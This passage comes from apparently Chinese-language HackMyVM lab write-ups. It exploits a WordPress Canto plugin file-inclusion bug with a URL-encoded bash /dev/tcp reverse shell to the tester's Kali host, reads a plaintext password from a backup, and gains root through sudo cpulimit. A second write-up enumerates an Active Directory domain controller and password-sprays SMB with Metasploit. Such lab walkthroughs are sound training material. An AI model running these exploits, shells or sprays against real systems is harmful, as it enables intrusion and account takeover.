<pre class="language-none"><code class="language-none">- Check the vulnerability
 python3 CVE-2023-3452.py -u http:&#x2F;&#x2F;192.168.1.142 -LHOST 192.168.1.33</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># python aa.py -u http://192.168.56.181 -LHOST 192.168.56.104</span>
Local web server on port <span class="token number">8080</span><span class="token punctuation">..</span>.
Exploitation URL: http://192.168.56.181/wp-content/plugins/canto/includes/lib/download.php?wp_abspath<span class="token operator">=</span>http://192.168.56.104:8080<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>whoami
<span class="token number">192.168</span>.56.181 - - <span class="token punctuation">[</span>05/Jun/2024 <span class="token number">16</span>:02:41<span class="token punctuation">]</span> <span class="token string">"GET /wp-admin/admin.php HTTP/1.1"</span> <span class="token number">200</span> -
Server response:
www-data

Shutting down <span class="token builtin class-name">local</span> web server<span class="token punctuation">..</span>.</code></pre>
<p>发现回显了www-data，说明这个poc可用!并且给了url，去这个url看一下<br><img src="https://ooo.0x0.ooo/2024/06/05/OJsLZS.png" alt="OJsLZS.png" loading="lazy"><br>ok了，弹个shell到kali<br>开个监听</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.</code></pre>
<p>将url后面的cmd改成<code>bash%20-c%20&#39;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261&#39;</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.181<span class="token punctuation">]</span> <span class="token number">41080</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">781</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@canto:/var/www/html/wp-content/plugins/canto/includes/lib$ </code></pre>
<p>拿到shell</p>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">14</span>:24 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">20</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">10</span>:49 <span class="token punctuation">..</span>
drwxr-xr--  <span class="token number">5</span> erik www-data <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">13</span>:56 erik</code></pre>
<p>只有一个erik用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home/erik$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-xr-- <span class="token number">5</span> erik www-data <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">13</span>:56 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">14</span>:24 <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> root root        <span class="token number">9</span> May <span class="token number">12</span> <span class="token number">13</span>:56 .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> erik erik      <span class="token number">220</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> erik erik     <span class="token number">3771</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .bashrc
drwx------ <span class="token number">2</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">12</span>:21 .cache
drwxrwxr-x <span class="token number">3</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">12</span>:03 .local
-rw-r--r-- <span class="token number">1</span> erik erik      <span class="token number">807</span> Jan  <span class="token number">7</span>  <span class="token number">2023</span> .profile
drwxrwxr-x <span class="token number">2</span> erik erik     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">17</span>:22 notes
-rw-r----- <span class="token number">1</span> root erik       <span class="token number">33</span> May <span class="token number">12</span> <span class="token number">12</span>:22 user.txt
www-data@canto:/home/erik$ <span class="token function">cat</span> us*
<span class="token function">cat</span> us*
cat: user.txt: Permission denied
www-data@canto:/home/erik$ </code></pre>
<p>没有权限读取user.txt，想着尝试去看看www目录有没有泄露什么数据库，用户名密码之类的<br>于是<code>cd ~</code>，却发现了很显眼的东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/home/erik$ <span class="token builtin class-name">cd</span> ~
<span class="token builtin class-name">cd</span> ~
www-data@canto:/var/www$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">20</span>
drwxr-xr-x  <span class="token number">4</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:52 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">15</span> root     root     <span class="token number">4096</span> May <span class="token number">12</span> <span class="token number">17</span>:14 <span class="token punctuation">..</span>
-rw-------  <span class="token number">1</span> www-data www-data  <span class="token number">523</span> Jun  <span class="token number">5</span> 07:55 .bash_history
drwx------  <span class="token number">2</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:52 .ssh
drwxr-xr-x  <span class="token number">5</span> www-data www-data <span class="token number">4096</span> Jun  <span class="token number">5</span> 07:11 html</code></pre>
<p>历史指令可以看，于是去看了一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/www$ <span class="token function">cat</span> .bash
<span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">cd</span> /var/wordpress
<span class="token builtin class-name">cd</span> /var
<span class="token builtin class-name">cd</span> /wordpress
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">TERM</span></span><span class="token operator">=</span>xterm
<span class="token function">clear</span>
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> wordpress
<span class="token builtin class-name">cd</span> wordpres
<span class="token function">ls</span>
<span class="token builtin class-name">cd</span> backups
<span class="token function">ls</span>
<span class="token function">clear</span>
<span class="token function">ls</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token function">unzip</span> dbbackup.zip
<span class="token function">ls</span>
<span class="token function">clear</span>
<span class="token function">ls</span> <span class="token parameter variable">-la</span>
<span class="token function">su</span> erik
<span class="token builtin class-name">cd</span> /var/wordpress/backups
<span class="token function">ls</span>
<span class="token function">cat</span> <span class="token number">12052024</span>.txt
<span class="token builtin class-name">exit</span>
reset
<span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">cat</span> user.txt
<span class="token builtin class-name">cd</span> ~
<span class="token function">ls</span> <span class="token parameter variable">-al</span></code></pre>
<p>习惯性地看了一下这个txt文件发现了erik用户的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/www$ <span class="token builtin class-name">cd</span> /var/wordpress/backups
<span class="token builtin class-name">cd</span> /var/wordpress/backups
www-data@canto:/var/wordpress/backups$ <span class="token function">cat</span> <span class="token number">12</span>*
<span class="token function">cat</span> <span class="token number">12</span>*
------------------------------------
<span class="token operator">|</span> Users     <span class="token operator">|</span>      Password        <span class="token operator">|</span>
------------<span class="token operator">|</span>----------------------<span class="token operator">|</span>
<span class="token operator">|</span> erik      <span class="token operator">|</span> th1sIsTheP3ssw0rd<span class="token operator">!</span>   <span class="token operator">|</span>
------------------------------------</code></pre>
<p>稳了<br>ssh连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@canto:/var/wordpress/backups$ <span class="token function">cat</span> <span class="token number">12052024</span>.txt 
------------------------------------
<span class="token operator">|</span> Users     <span class="token operator">|</span>      Password        <span class="token operator">|</span>
------------<span class="token operator">|</span>----------------------<span class="token operator">|</span>
<span class="token operator">|</span> erik      <span class="token operator">|</span> th1sIsTheP3ssw0rd<span class="token operator">!</span>   <span class="token operator">|</span>
------------------------------------
www-data@canto:/var/wordpress/backups$ <span class="token function">ssh</span> erik@127.0.0.1
erik@127.0.0.1's password: 
Welcome to Ubuntu <span class="token number">23.10</span> <span class="token punctuation">(</span>GNU/Linux <span class="token number">6.5</span>.0-28-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jun  <span class="token number">5</span> 08:10:40 AM UTC <span class="token number">2024</span>

  System load: <span class="token number">0.04</span>              Memory usage: <span class="token number">21</span>%   Processes:       <span class="token number">128</span>
  Usage of /:  <span class="token number">41.9</span>% of <span class="token number">8</span>.02GB   Swap usage:   <span class="token number">0</span>%    Users logged in: <span class="token number">0</span>


<span class="token number">0</span> updates can be applied immediately.


The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Wed Jun  <span class="token number">5</span> 07:52:18 <span class="token number">2024</span> from <span class="token number">127.0</span>.0.1
erik@canto:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>erik<span class="token punctuation">)</span></code></pre>
<p>于是拿到user.txt</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>习惯性地sudo一下，发现可以sudo 提权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">erik@canto:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> erik on canto:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User erik may run the following commands on canto:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/cpulimit</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/05/OJsEcN.png" alt="OJsEcN.png" loading="lazy"><br>拿来主义！</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">erik@canto:~$ <span class="token function">sudo</span> cpulimit <span class="token parameter variable">-l</span> <span class="token number">100</span> <span class="token parameter variable">-f</span> /bin/sh
Process <span class="token number">1735</span> detected
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>拿到root权限，也拿到了root flag。<br>可惜，二血，还是太菜了，菜就多练吧。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>cpulimit</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-DC01</title>
    <url>/posts/55ea1c6/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.128</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:3b:0f:e6       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.128  08:00:27:68:1c:ef       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.930</span> seconds <span class="token punctuation">(</span><span class="token number">132.64</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap -p- <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-sS</span> <span class="token parameter variable">-T4</span> <span class="token number">192.168</span>.56.128                                      
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 <span class="token number">12</span>:24 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.128
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00020s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65517</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2024</span>-07-15 <span class="token number">19</span>:26:22Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token operator">|</span>_http-title: Not Found
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49664</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49670</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49683</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49702</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:68:1C:EF <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running <span class="token punctuation">(</span>JUST GUESSING<span class="token punctuation">)</span>: Microsoft Windows <span class="token number">2022</span><span class="token operator">|</span><span class="token number">11</span><span class="token operator">|</span><span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server <span class="token number">2022</span> <span class="token punctuation">(</span><span class="token number">97</span>%<span class="token punctuation">)</span>, Microsoft Windows <span class="token number">11</span> 21H2 <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>, Microsoft Windows Server <span class="token number">2016</span> <span class="token punctuation">(</span><span class="token number">91</span>%<span class="token punctuation">)</span>
No exact OS matches <span class="token keyword">for</span> <span class="token function">host</span> <span class="token punctuation">(</span>test conditions non-ideal<span class="token punctuation">)</span>.
Network Distance: <span class="token number">1</span> hop
Service Info: Host: DC01<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2024</span>-07-15T19:27:14
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: 14h59m57s
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required
<span class="token operator">|</span>_nbstat: NetBIOS name: DC01, NetBIOS user: <span class="token operator">&lt;</span>unknown<span class="token operator">></span>, NetBIOS MAC: 08:00:27:68:1c:ef <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.20</span> ms <span class="token number">192.168</span>.56.128

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">185.67</span> seconds</code></pre>
<p>开放了很多端口，还有DNS，LDAP,SMB等服务，先从熟悉的SMB看起</p>
<h2 id="SMB探测"><a href="#SMB探测" class="headerlink" title="SMB探测"></a>SMB探测</h2><p>跑一下匿名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbmap <span class="token parameter variable">-H</span>  <span class="token number">192.168</span>.56.128 <span class="token parameter variable">-u</span> anonymous

    ________  ___      ___  _______   ___      ___       __         _______
   /<span class="token string">"       )|"</span>  <span class="token punctuation">\</span>    /<span class="token string">"  ||   _  "</span><span class="token punctuation">\</span> <span class="token operator">|</span><span class="token string">"  \    /"</span>  <span class="token operator">|</span>     /<span class="token string">""</span><span class="token punctuation">\</span>       <span class="token operator">|</span>   __ <span class="token string">"\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /"</span> <span class="token punctuation">\</span>   <span class="token builtin class-name">:</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">||</span><span class="token builtin class-name">:</span> <span class="token operator">|</span>_<span class="token punctuation">)</span>  <span class="token builtin class-name">:</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token builtin class-name">.</span>  <span class="token punctuation">\</span>    /:  <span class="token operator">|</span> /   /  <span class="token punctuation">\</span>   <span class="token punctuation">\</span>  /<span class="token operator">|</span>__/ <span class="token punctuation">\</span>
  <span class="token punctuation">(</span>_______/  <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>_______/ <span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__/<span class="token operator">|</span>___<span class="token operator">|</span><span class="token punctuation">(</span>___/    <span class="token punctuation">\</span>___<span class="token punctuation">)</span><span class="token punctuation">(</span>_______<span class="token punctuation">)</span>
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator <span class="token operator">|</span> Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Detected <span class="token number">1</span> hosts serving SMB
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Established <span class="token number">1</span> SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>                                
                                                                                                    
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> IP: <span class="token number">192.168</span>.56.128:445      Name: <span class="token number">192.168</span>.56.128            Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</code></pre>
<p>有共享目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient  //192.168.56.128/IPC$
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>root<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
NT_STATUS_NO_SUCH_FILE listing <span class="token punctuation">\</span>*
smb: <span class="token punctuation">\</span><span class="token operator">></span> </code></pre>
<p>IPC$可以看但是空的。IPC$启用共享，可以通过lookupsid.py枚举用户</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> lookupsid.py anonymous@192.168.56.128
Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Brute forcing SIDs at <span class="token number">192.168</span>.56.128
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StringBinding ncacn_np:192.168.56.128<span class="token punctuation">[</span><span class="token punctuation">\</span>pipe<span class="token punctuation">\</span>lsarpc<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Domain SID is: S-1-5-21-2986980474-46765180-2505414164
<span class="token number">498</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">500</span>: SOUPEDECODE<span class="token punctuation">\</span>Administrator <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">501</span>: SOUPEDECODE<span class="token punctuation">\</span>Guest <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">502</span>: SOUPEDECODE<span class="token punctuation">\</span>krbtgt <span class="token punctuation">(</span>SidTypeUser<span class="token punctuation">)</span>
<span class="token number">512</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">513</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">514</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Guests <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">515</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Computers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">516</span>: SOUPEDECODE<span class="token punctuation">\</span>Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">517</span>: SOUPEDECODE<span class="token punctuation">\</span>Cert Publishers <span class="token punctuation">(</span>SidTypeAlias<span class="token punctuation">)</span>
<span class="token number">518</span>: SOUPEDECODE<span class="token punctuation">\</span>Schema Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">519</span>: SOUPEDECODE<span class="token punctuation">\</span>Enterprise Admins <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">520</span>: SOUPEDECODE<span class="token punctuation">\</span>Group Policy Creator Owners <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">521</span>: SOUPEDECODE<span class="token punctuation">\</span>Read-only Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">522</span>: SOUPEDECODE<span class="token punctuation">\</span>Cloneable Domain Controllers <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token number">525</span>: SOUPEDECODE<span class="token punctuation">\</span>Protected Users <span class="token punctuation">(</span>SidTypeGroup<span class="token punctuation">)</span>
<span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.</code></pre>
<p>将用户名生成一个字典</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> users.txt <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print substr($2, 13)&#125;'</span> <span class="token operator">></span> username.txt</code></pre>
<p>密码爆破一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_FILE username.txt
USER_FILE <span class="token operator">=</span><span class="token operator">></span> username.txt
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> USER_AS_PASS <span class="token boolean">true</span>
USER_AS_PASS <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span>
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Msf::OptionValidateError One or <span class="token function">more</span> options failed to validate: RHOSTS.
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.56.128
rhost <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.56.128
msf6 auxiliary<span class="token punctuation">(</span>scanner/smb/smb_login<span class="token punctuation">)</span> <span class="token operator">></span> run
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> <span class="token number">192.168</span>.56.128:445    - <span class="token number">192.168</span>.56.128:445 - Success: <span class="token string">'.\ybob317:ybob317'</span></code></pre>
<p>拿到一组账号密码<code>ybob317:ybob317</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> smbclient //192.168.56.128/Users <span class="token parameter variable">-U</span> ybob317
Password <span class="token keyword">for</span> <span class="token punctuation">[</span>WORKGROUP<span class="token punctuation">\</span>ybob317<span class="token punctuation">]</span>:
Try <span class="token string">"help"</span> to get a list of possible commands.
smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">ls</span>
  <span class="token builtin class-name">.</span>                                  DR        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:24:29 <span class="token number">2024</span>
  <span class="token punctuation">..</span>                                DHS        <span class="token number">0</span>  Tue Jun <span class="token number">18</span> 01:42:50 <span class="token number">2024</span>
  Administrator                       D        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 03:56:40 <span class="token number">2024</span>
  All Users                       DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  Default                           DHR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> <span class="token number">10</span>:51:08 <span class="token number">2024</span>
  Default User                    DHSrn        <span class="token number">0</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:26:16 <span class="token number">2021</span>
  desktop.ini                       AHS      <span class="token number">174</span>  Sat May  <span class="token number">8</span> <span class="token number">16</span>:14:03 <span class="token number">2021</span>
  Public                             DR        <span class="token number">0</span>  Sun Jun <span class="token number">16</span> 01:54:32 <span class="token number">2024</span>
